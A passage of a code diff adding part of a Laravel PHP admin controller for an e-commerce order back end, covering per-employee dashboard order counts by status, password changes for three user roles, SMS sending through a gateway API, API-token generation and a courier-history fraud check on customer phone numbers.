+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 11]])
+                ->count();
+            $data['total_incomplete_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 12]])
+                ->count();
+            $data['total_confirmed_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 13]])
+                ->count();
+            $data['total_stock_out_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 14]])
+                ->count();
+            $data['total_partial_delivery_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 15]])
+                ->count();
+            $data['total_lost_order'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 16]])
+                ->count();
+
+
+
+            $data['today_all_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where('order_assigns.employee_id', Auth::guard('employee')->id())
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_hold_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 0]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_deliver_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 1]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_process_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 2]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_pend_pay_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 3]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_cancel_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 4]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_pending_invoice_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 5]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_on_delivery_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 6]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_pending_return_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 7]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_courier_hold_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 8]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_nr_1_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 9]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_invoiced_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 10]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_return_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 11]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            // $data['today_incomplete_orders'] = DB::table('order_assigns')
+            //     ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+            //     ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 12]])
+            //     ->whereDate('orders.order_date', Carbon::today())
+            //     ->count();
+            $data['today_confirmed_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 13]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_stock_out_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 14]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_partial_delivery_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 15]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+            $data['today_lost_orders'] = DB::table('order_assigns')
+                ->leftJoin('orders', 'orders.id', 'order_assigns.order_id')
+                ->where([['order_assigns.employee_id', Auth::guard('employee')->id()], ['status', 16]])
+                ->whereDate('orders.order_date', Carbon::today())
+                ->count();
+
+            //dd($data['today_hold_orders']);
+        } else {
+            $data = [];
+        }
+
+        //dd($data['recent_orders']);
+        return view('backEnd.admin.dashboard', compact('data', 'top_cities', 'top_sell'));
+    }
+
+    //change password
+    public function change_pass()
+    {
+        return view('backEnd.admin.change_pass');
+    }
+
+    public function update_pass(Request $request)
+    {
+        if (Auth::guard('admin')->check()) {
+            $user_id = Auth::guard('admin')->id();
+            if (Hash::check($request->old_pass, Admin::find($user_id)->password)) {
+                Admin::find($user_id)->update([
+                    'password' => Hash::make($request->password),
+                ]);
+
+                $this->guard_admin()->logout();
+
+                $request->session()->invalidate();
+
+                $request->session()->regenerateToken();
+
+                return $this->loggedOut($request) ?: redirect()->route('admin.home')->with('success', 'Password Changed Successfully');
+            } else {
+                return back()->with('error', 'Incorrect Old Password');
+            }
+        } elseif (Auth::guard('manager')->check()) {
+            $user_id = Auth::guard('manager')->id();
+            if (Hash::check($request->old_pass, Manager::find($user_id)->password)) {
+                Manager::find($user_id)->update([
+                    'password' => Hash::make($request->password),
+                ]);
+
+                $this->guard_manager()->logout();
+
+                $request->session()->invalidate();
+
+                $request->session()->regenerateToken();
+
+                return $this->loggedOut($request) ?: redirect()->route('manager.home')->with('success', 'Password Changed Successfully');
+            } else {
+                return back()->with('error', 'Incorrect Old Password');
+            }
+        } elseif (Auth::guard('employee')->check()) {
+            $user_id = Auth::guard('employee')->id();
+            if (Hash::check($request->old_pass, Employee::find($user_id)->password)) {
+                Employee::find($user_id)->update([
+                    'password' => Hash::make($request->password),
+                ]);
+
+                $this->guard_employee()->logout();
+
+                $request->session()->invalidate();
+
+                $request->session()->regenerateToken();
+
+                return $this->loggedOut($request) ?: redirect()->route('employee.home')->with('success', 'Password Changed Successfully');
+            } else {
+                return back()->with('error', 'Incorrect Old Password');
+            }
+        } else {
+            return back()->with('warning', 'Something Went Wrong!');
+        }
+    }
+
+    protected function loggedOut(Request $request)
+    {
+
+    }
+
+    protected function guard_admin()
+    {
+        return Auth::guard('admin');
+    }
+
+    protected function guard_manager()
+    {
+        return Auth::guard('manager');
+    }
+
+    protected function guard_employee()
+    {
+        return Auth::guard('employee');
+    }
+
+    public function stock()
+    {
+        return view('backEnd.admin.stock');
+    }
+
+    public function sendSms(Request $request)
+    {
+        //dd($request->all());
+        $apikey = config('app.sms_api_key');
+        //$sender = config('app.sms_sender');
+
+        $msisdn = ltrim(BanglaToEnglishConverter::bn2en($request->customer_phone), '+');
+        //dd($apikey, $msisdn, $text);
+        $curl = curl_init();
+
+        curl_setopt_array($curl, array(
+            CURLOPT_URL => 'https://api.sms.net.bd/sendsms',
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_CUSTOMREQUEST => 'POST',
+            CURLOPT_POSTFIELDS => array('api_key' => $apikey, 'msg' => $request->sms_body, 'to' => $msisdn),
+        ));
+
+        $response = curl_exec($curl);
+
+        curl_close($curl);
+        //dd($response);
+        if (json_decode($response, true)['error'] == 0) {
+            return response()->json(['success' => 'SMS Sent Successfully']);
+        } else {
+            return response()->json(['error' => json_decode($response, true)['msg']]);
+        }
+        //return back()->with('success','SMS Sent Successfully');
+    }
+
+    public function generateAPIToken()
+    {
+        WebSettings::find(1)->update([
+            'api_access_token' => Str::random(150),
+        ]);
+        return back()->with('success', 'API Token Generated Successfully');
+    }
+
+    public function fakeRemove($id)
+    {
+        DB::table('orders')->where('id', $id)->update([
+            'is_fake' => 0,
+        ]);
+        return back()->with('success', 'Removed Successfully');
+    }
+
+    public function fraudCheck(Request $request, $id)
+    {
+        $order = Order::select('id', 'status', 'customer_phone', 'customer_activity')->find($id);
+        //dd($customer_number);
+        if (strlen($order->customer_phone) == 11) {
+            /*$curl = curl_init();
+            curl_setopt_array($curl, array(
+                CURLOPT_URL => 'https://courierrank.com/api/get-customer-details/' . $order->customer_phone,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_ENCODING => '',
+                CURLOPT_MAXREDIRS => 10,
+                CURLOPT_TIMEOUT => 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+                CURLOPT_CUSTOMREQUEST => 'POST',
+                CURLOPT_HTTPHEADER => array(
+                    'Authorization: Bearer ' . env('TJ_FC_API'),
+                ),
+            ));
+            $response = curl_exec($curl);*/
+
+            $curl = curl_init();
+
+            curl_setopt_array($curl, array(
+                CURLOPT_URL => 'https://bdcourier.com/api/courier-check?phone=' . $order->customer_phone,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_ENCODING => '',
+                CURLOPT_MAXREDIRS => 10,
+                CURLOPT_TIMEOUT => 0,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+                CURLOPT_CUSTOMREQUEST => 'POST',
+                CURLOPT_HTTPHEADER => array(
+                    'Authorization: Bearer ' . env('TJ_FC_API'),
+                ),
+            ));
+
+            $response = curl_exec($curl);
+
+            curl_close($curl);
+
+            //dd(json_decode($response));
+            /*if (json_decode($response) && json_decode($response)->phone) {
+                $data = [
+                    'total' => json_decode($response)->pathao_delivered + json_decode($response)->pathao_returned + json_decode($response)->steadfast_delivered + json_decode($response)->steadfast_returned + json_decode($response)->redx_delivered + json_decode($response)->redx_returned,
+                    'total_delivered' => json_decode($response)->pathao_delivered + json_decode($response)->steadfast_delivered + json_decode($response)->redx_delivered,
+                    'total_returned' => json_decode($response)->pathao_returned + json_decode($response)->steadfast_returned + json_decode($response)->redx_returned,
+                    'pathao_delivered' => json_decode($response)->pathao_delivered,
+                    'pathao_returned' => json_decode($response)->pathao_returned,
+                    'steadfast_delivered' => json_decode($response)->steadfast_delivered,
+                    'steadfast_returned' => json_decode($response)->steadfast_returned,
+                    'redx_delivered' => json_decode($response)->redx_delivered,
+                    'redx_returned' => json_decode($response)->redx_returned,
+                ];
+            } else {
+                return back()->with('error', 'Something went wrong');
+            }*/
+            if (json_decode($response) && json_decode($response)->status == 'success') {
+                $data = [
+                    'total' => json_decode($response)->courierData->summary->total_parcel,
+                    'total_delivered' => json_decode($response)->courierData->summary->success_parcel,
+                    'total_returned' => json_decode($response)->courierData->summary->cancelled_parcel,
+                    'pathao_delivered' => json_decode($response)->courierData->pathao->success_parcel,
+                    'pathao_returned' => json_decode($response)->courierData->pathao->cancelled_parcel,
+                    'steadfast_delivered' => json_decode($response)->courierData->steadfast->success_parcel,
+                    'steadfast_returned' => json_decode($response)->courierData->steadfast->cancelled_parcel,
+                    'redx_delivered' => json_decode($response)->courierData->redx->success_parcel,
+                    'redx_returned' => json_decode($response)->courierData->redx->cancelled_parcel,
+                ];
+
+                //dd($data);
+                $order->update([
+                    'customer_activity' => json_encode($data),
+                ]);
+                return back()->with('success', 'Activity Updated Successfully');
+            } else {
+                return back()->with('error', 'Something went wrong');
+            }
+        } else {
+            return back()->with('warning', 'Phone number is not 11 digit');
+        }
+    }
+}
